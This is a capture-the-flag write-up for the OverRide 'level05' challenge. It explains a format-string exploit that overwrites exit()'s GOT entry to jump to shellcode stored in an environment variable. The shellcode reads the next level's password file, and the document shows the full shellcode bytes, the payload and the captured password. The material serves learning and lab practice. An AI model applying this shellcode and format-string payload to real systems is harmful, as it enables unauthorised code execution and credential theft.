# Level05

This level adds an extra security layer before letting us `printf()` our input.
We have control over the format string BUT before calling `printf()`, the program
changes every capitalize character to a normal one. This is a problem for shellcodes
as some of the bytes used in shellcodes can be mistaken for characters, so our
usual shellcode cannot be given in the input. However we can defenitly put our
shellcode somewhere else... like the environment.

```c
fgets(str, 100, stdin);
for (i = 0; i < strlen(str); ++i)
{
	//  0x41 'A'     0x5a 'Z'
	if (str[i] > 65 && str[i] <= 90)
		str[i] ^= 0x20;
}
printf(str);
exit(0);
```

The idea is to overwrite the GOT of `exit()` with the address of the environment
variable `SHELLCODE` that will countain our shellcode.

The shellcode is the same as the previous exercise, only the `/home/users/level05/.pass`
is changed with `/home/users/level06/.pass`.

```bash
python -c 'print("\x90" * 20 + "\x6a\x01" * 10 + "\x6a\x73" +
"\x68\x2e\x70\x61\x73" +
"\x68\x30\x36\x2f\x2f" +
"\x68\x65\x76\x65\x6c" +
"\x68\x72\x73\x2f\x6c" +
"\x68\x2f\x75\x73\x65" +
"\x68\x68\x6f\x6d\x65" +
"\x68\x2f\x2f\x2f\x2f" +
"\x31\xc0" +
"\x31\xd2" +
"\x31\xc9" +
"\x31\xdb" +
"\xb0\x05" +
"\x89\xe3" +
"\xb1\x02" +
"\xb2\x01" +
"\xcd\x80" +
"\x89\xc3" +
"\xb0\x03" +
"\x89\xe1" +
"\xb2\x29" +
"\xcd\x80" +
"\xb0\x04" +
"\xb3\x01" +
"\x89\xe1" +
"\xb2\x29" +
"\xcd\x80" +
"\xb0\x01" +
"\xcd\x80"
)')
```

Then we need to know the address of the shellcode environment variable.

```c
int main() {
        printf("%p\n", getenv("SHELLCODE"));
}
```

```bash
level05@OverRide:~$ env -i SHELLCODE=$SHELLCODE /tmp/code
0xffffdf76
```

After this, we can use the python script to generate a good format string exploit.

```bash
$> python level05/Ressources/level05.py 0x080497e0 0xffffdf76
< <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c%c%c%c%c%c%c%c" + "%57186c" + "%hn" + "%8329c" + "%hn")')
```

And we can finish by running the executable with the good input to run our shellcode.

```bash
level05@OverRide:~$ env -i SHELLCODE=$SHELLCODE ./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c%c%c%c%c%c%c%c" + "%57186c" + "%hn" + "%8329c" + "%hn")')

[...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
